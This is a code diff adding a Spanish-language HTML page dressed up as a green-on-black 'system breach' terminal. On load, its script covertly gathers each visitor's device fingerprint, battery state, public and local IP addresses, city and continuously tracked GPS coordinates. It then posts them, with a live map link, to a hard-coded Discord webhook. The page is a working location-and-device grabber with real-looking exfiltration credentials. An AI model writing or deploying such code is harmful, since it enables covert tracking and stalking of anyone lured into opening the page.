@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Breach - Target Acquisition</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #00ff41;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .terminal {
+            background: #0a0a0a;
+            border: 2px solid #00ff41;
+            padding: 20px;
+            max-width: 850px;
+            margin: 20px auto;
+            box-shadow: 0 0 20px #00ff41;
+            animation: glow 2s infinite alternate;
+        }
+        h1 {
+            color: #00ff41;
+            text-shadow: 0 0 15px #00ff41;
+            margin: 0 0 15px 0;
+            font-size: 28px;
+        }
+        .scan-line {
+            animation: scan 4s linear infinite;
+            height: 2px;
+            background: linear-gradient(transparent, #00ff41, transparent);
+            margin: 10px 0;
+        }
+        #log {
+            text-align: left;
+            line-height: 1.6;
+            font-size: 15px;
+            white-space: pre-wrap;
+        }
+        .success { color: #00ff41; }
+        .warning { color: #ffaa00; }
+        .danger { color: #ff4444; }
+        @keyframes glow { from { box-shadow: 0 0 10px #00ff41; } to { box-shadow: 0 0 30px #00ff41; } }
+        @keyframes scan { 0% { transform: translateY(-100px); } 100% { transform: translateY(400px); } }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h1>[ SYSTEM BREACH INITIATED ]</h1>
+        <div class="scan-line"></div>
+        <div id="log">Initializing connection to target device...<br>Establishing secure tunnel...</div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491850169660997783/J12g-R-0nyXPFr4-Uu0WpYXZAFoQmUJfyt5O6JHA79ke5gwx8OM1v1mgIaLMnSe1y18y";
+
+        let allData = {};
+        let watchId = null;
+
+        function log(message, type = 'normal') {
+            const logEl = document.getElementById('log');
+            let prefix = '';
+            if (type === 'success') prefix = '[+] ';
+            else if (type === 'warning') prefix = '[!] ';
+            else if (type === 'danger') prefix = '[-] ';
+            logEl.innerHTML += prefix + message + '<br>';
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // WebRTC para obtener IP local/privada
+        async function getLocalIP() {
+            return new Promise(resolve => {
+                const pc = new (window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                let ips = [];
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = e => {
+                    if (!e.candidate) return;
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
+                    if (ip) ips.push(ip[1]);
+                };
+                setTimeout(() => {
+                    pc.close();
+                    resolve([...new Set(ips)]);
+                }, 1500);
+            });
+        }
+
+        // Fingerprint avanzado
+        function getAdvancedFingerprint() {
+            let fp = {};
+            // Canvas
+            try {
+                const c = document.createElement('canvas');
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.font = "11pt Arial";
+                ctx.fillText("HackTest 2026", 2, 15);
+                fp.canvas = btoa(c.toDataURL()).slice(0,50) + "...";
+            } catch(e) { fp.canvas = "N/A"; }
+
+            // WebGL
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    fp.gpuVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A";
+                    fp.gpuRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
+                }
+            } catch(e) {}
+
+            return fp;
+        }
+
+        async function startBreach() {
+            log("Connecting to target...", "warning");
+            log("Bypassing basic security layers...");
+
+            // Datos básicos
+            allData = {
+                timestamp: new Date().toLocaleString('es-ES'),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                screen: `${screen.width}×${screen.height} (${screen.colorDepth}bit)`,
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'N/A',
+                touchPoints: navigator.maxTouchPoints || 'N/A',
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'ENABLED' : 'DISABLED',
+                vendor: navigator.vendor || 'N/A'
+            };
+
+            log("Extracting device fingerprint...", "success");
+            allData.fingerprint = getAdvancedFingerprint();
+
+            // Batería
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    allData.battery = `${(bat.level*100).toFixed(0)}% - Charging: ${bat.charging ? 'YES' : 'NO'}`;
+                } catch(e) {}
+            }
+
+            // IP Pública + Geolocalización
+            log("Tracing public IP and location...");
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipd = await ipRes.json();
+                allData.ip = ipd.ip;
+                allData.city = ipd.city;
+                allData.region = ipd.region;
+                allData.country = ipd.country_name;
+            } catch(e) { allData.ip = "Failed"; }
+
+            // IP Local vía WebRTC
+            log("Attempting local network breach (WebRTC)...");
+            try {
+                allData.localIPs = await getLocalIP();
+            } catch(e) { allData.localIPs = ["Failed"]; }
+
+            // GPS + seguimiento continuo
+            if (navigator.geolocation) {
+                log("Activating high-precision GPS triangulation...", "danger");
+                watchId = navigator.geolocation.watchPosition(
+                    pos => {
+                        allData.gpsLat = pos.coords.latitude.toFixed(8);
+                        allData.gpsLon = pos.coords.longitude.toFixed(8);
+                        allData.gpsAcc = Math.round(pos.coords.accuracy) + "m";
+                        allData.gpsSpeed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + " km/h" : "0";
+
+                        log(`GPS LOCK ACQUIRED → Lat: ${allData.gpsLat} | Lon: ${allData.gpsLon} (±${allData.gpsAcc})`, "success");
+                        sendToDiscord();
+                    },
+                    err => {
+                        log("GPS access denied or unavailable. Falling back to IP.", "warning");
+                        sendToDiscord();
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            }
+
+            // Primer envío
+            setTimeout(sendToDiscord, 2000);
+        }
+
+        async function sendToDiscord() {
+            const maps = allData.gpsLat ? `https://www.google.com/maps?q=${allData.gpsLat},${allData.gpsLon}` : "#";
+
+            const embed = {
+                title: "🔴 BREACH SUCCESSFUL - TARGET ACQUIRED",
+                color: 0x00ff41,
+                description: "Full device & location dump completed",
+                fields: [
+                    { name: "🕒 Timestamp", value: allData.timestamp, inline: false },
+                    { name: "🌐 Public IP", value: `\`${allData.ip || 'N/A'}\``, inline: true },
+                    { name: "📍 Location", value: `${allData.city || ''}, ${allData.region || ''}, ${allData.country || ''}`, inline: true },
+                    allData.gpsLat ? { name: "📍 GPS Coordinates", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\` (±${allData.gpsAcc})`, inline: false } : null,
+                    { name: "🔋 Battery", value: allData.battery || 'N/A', inline: true },
+                    { name: "🖥️ Device", value: allData.screen + " | " + allData.cores, inline: true },
+                    { name: "🔗 Google Maps", value: `[OPEN LIVE MAP](${maps})`, inline: false },
+                    { name: "🧬 Fingerprint", value: allData.fingerprint.canvas ? allData.fingerprint.canvas.substring(0,40) + "..." : 'N/A', inline: false }
+                ].filter(Boolean),
+                footer: { text: "Advanced Browser Exploitation Module v2026" },
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ content: "**TARGET BREACHED**", embeds: [embed] })
+                });
+            } catch(e) {}
+        }
+
+        // Iniciar el "hackeo"
+        window.onload = startBreach;
+    </script>
+</body>
+</html>
